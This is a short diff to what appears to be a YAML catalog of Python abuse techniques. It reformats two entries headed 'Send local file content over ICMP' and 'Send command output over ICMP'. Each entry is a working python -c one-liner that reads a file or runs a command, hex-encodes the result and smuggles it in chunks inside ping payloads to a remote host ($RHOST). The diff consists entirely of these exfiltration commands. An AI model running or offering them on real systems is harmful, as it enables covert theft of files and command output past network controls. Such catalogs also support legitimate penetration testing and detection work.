@@ -31,11 +31,13 @@ functions:
 
         Send local file content over ICMP using hex-encoded payloads.
       code: |
-        python -c 'import sys,os;d=open("$FILE","rb").read();d=d.hex() if sys.version_info[0]==3 else d.encode("hex");
+        python -c 'import sys,os;d=open("$FILE","rb").read();
+        d=d.hex() if sys.version_info[0]==3 else d.encode("hex");
         [os.system("ping -c1 -p "+d[i:i+16]+" $RHOST") for i in range(0,len(d),16)]'
 
     - description: Send command output over ICMP using hex-encoded payloads.
       code: |
-        python -c 'import sys,os;d=os.popen("$CMD").read();d=d.encode().hex() if sys.version_info[0]==3 else d.encode("hex");
+        python -c 'import sys,os;d=os.popen("$CMD").read();
+        d=d.encode().hex() if sys.version_info[0]==3 else d.encode("hex");
         [os.system("ping -c1 -p "+d[i:i+16]+" $RHOST") for i in range(0,len(d),16)]'
 ---
